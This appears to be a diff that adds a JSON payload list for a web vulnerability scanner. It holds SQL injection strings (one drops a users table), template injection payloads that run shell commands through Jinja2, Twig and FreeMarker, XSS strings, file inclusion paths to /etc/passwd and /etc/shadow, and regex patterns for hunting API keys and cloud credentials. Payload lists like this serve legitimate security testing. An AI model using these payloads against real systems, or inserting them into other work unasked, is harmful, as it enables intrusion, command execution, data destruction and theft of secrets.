@@ -1,0 +1,140 @@
+{
+    "sqli": {
+        "error_based": [
+            "'",
+            "\"",
+            "' OR '1'='1",
+            "\" OR \"1\"=\"1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "' OR 1=1 --",
+            "1' ORDER BY 1--+",
+            "1' ORDER BY 10--+",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "1' AND '1'='1",
+            "1' AND '1'='2",
+            "admin'--",
+            "') OR ('1'='1",
+            "'; DROP TABLE users--"
+        ],
+        "blind_boolean": [
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "' AND 'a'='a",
+            "' AND 'a'='b",
+            "1 AND 1=1",
+            "1 AND 1=2",
+            "' OR 1=1--",
+            "' OR 1=2--"
+        ],
+        "time_based": [
+            "'; WAITFOR DELAY '0:0:5'--",
+            "'; SELECT SLEEP(5)--",
+            "' AND SLEEP(5)--",
+            "1' AND SLEEP(5)#",
+            "' OR SLEEP(5)--",
+            "'; SELECT pg_sleep(5)--",
+            "1; WAITFOR DELAY '0:0:5'--"
+        ]
+    },
+    "ssti": {
+        "detection": [
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>",
+            "#{7*7}",
+            "*{7*7}",
+            "@(7*7)",
+            "{{7*'7'}}",
+            "{{config}}",
+            "{{self}}",
+            "${T(java.lang.Runtime)}",
+            "{{''.__class__}}"
+        ],
+        "jinja2": [
+            "{{config.items()}}",
+            "{{request.environ}}",
+            "{{''.__class__.__mro__[2].__subclasses__()}}",
+            "{{''.__class__.__base__.__subclasses__()}}",
+            "{{lipsum.__globals__}}",
+            "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+        ],
+        "twig": [
+            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
+            "{{_self.env.getFilter('id')}}",
+            "{{['id']|filter('system')}}"
+        ],
+        "freemarker": [
+            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+        ],
+        "expected_results": {
+            "{{7*7}}": "49",
+            "${7*7}": "49",
+            "<%= 7*7 %>": "49",
+            "#{7*7}": "49",
+            "{{7*'7'}}": "7777777"
+        }
+    },
+    "xss": {
+        "basic": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<body onload=alert('XSS')>",
+            "'\"><script>alert('XSS')</script>",
+            "<iframe src=\"javascript:alert('XSS')\">",
+            "<input onfocus=alert('XSS') autofocus>"
+        ],
+        "encoded": [
+            "%3Cscript%3Ealert('XSS')%3C/script%3E",
+            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"
+        ]
+    },
+    "lfi": {
+        "unix": [
+            "../../../etc/passwd",
+            "....//....//....//etc/passwd",
+            "/etc/passwd",
+            "/etc/shadow",
+            "/proc/self/environ",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://input",
+            "file:///etc/passwd"
+        ],
+        "windows": [
+            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "C:\\boot.ini"
+        ]
+    },
+    "secrets_patterns": {
+        "api_keys": [
+            "api[_-]?key",
+            "apikey",
+            "api[_-]?secret",
+            "access[_-]?token",
+            "auth[_-]?token",
+            "client[_-]?secret",
+            "private[_-]?key"
+        ],
+        "cloud": [
+            "AKIA[0-9A-Z]{16}",
+            "aws[_-]?secret",
+            "aws[_-]?access[_-]?key",
+            "GOOG[\\w\\W]{10,30}",
+            "AIza[0-9A-Za-z\\-_]{35}"
+        ],
+        "database": [
+            "mysql://",
+            "postgres://",
+            "mongodb://",
+            "redis://",
+            "jdbc:"
+        ]
+    }
+}
